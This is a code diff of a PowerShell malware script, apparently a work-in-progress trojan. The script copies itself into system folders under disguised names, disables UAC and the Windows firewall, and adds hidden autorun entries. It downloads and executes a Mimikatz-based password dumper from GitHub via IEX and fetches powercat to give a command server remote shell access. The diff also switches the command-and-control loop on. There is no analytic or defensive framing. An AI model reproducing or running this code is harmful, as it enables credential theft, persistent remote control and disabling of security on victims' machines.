@@ -2,11 +2,14 @@
 $Env:path=$Env:Path+";C:\Windows\System32\WindowsPowerShell\v1.0\"  
 
 # copy self to temp path
-cp $MyInvocation.MyCommand.Path "$env:temp\fdisk.ps1"
+if($MyInvocation.MyCommand.Path -ne "$env:temp\fdisk.ps1") {
+    cp $MyInvocation.MyCommand.Path "$env:temp\fdisk.ps1"
+}
 
 # copy self to powershell root path
-cp $MyInvocation.MyCommand.Path "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"
-
+if($MyInvocation.MyCommand.Path -ne "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1") {
+    cp $MyInvocation.MyCommand.Path "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"
+}
 
 if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 
@@ -14,20 +17,13 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 	New-ItemProperty -Path "HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System" -Name EnableLUA -PropertyType DWORD -Value 0x00000000 -Force
 	netsh advfirewall set allprofiles state off
 
-	# add persistence
-	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
-	Add-Persistence -ScriptPath "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"
-
 	# auto-run
 	New-ItemProperty -Path "HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/run" -Name Sysprep -PropertyType String -Value  `
     'powershell -NoP -NonI -W Hidden -c "Start-Process C:\Windows\System32\Sysprep\sysprep.exe -WindowStyle Hidden"' -Force
 
 	# dump login user password
 	$strFileName="c:\windows\zaccount.log"
-	If (Test-Path $strFileName){
-		# // File exists
-	
-	}Else{
+	If (!(Test-Path $strFileName)){
 		# // File does not exist
 		IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1')
 		Invoke-MimikatzWDigestDowngrade
@@ -42,8 +38,7 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
             $info = Invoke-RestMethod -Method Get -Uri $server
             $strPowercat = (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
             
-            if($info.url -eq "") {
-            } else {
+            if($info.url -ne "") {
                 Import-Module BitsTransfer
                 Start-BitsTransfer $info.url ("$env:temp\"+$info.filename)
 
@@ -59,7 +54,7 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
         Start-Sleep -Seconds 3
     }
 
-    While(0){
+    While(1){
         Try {
             start-job -ArgumentList $info,$strPowercat {
                 param($info,$strPowercat)
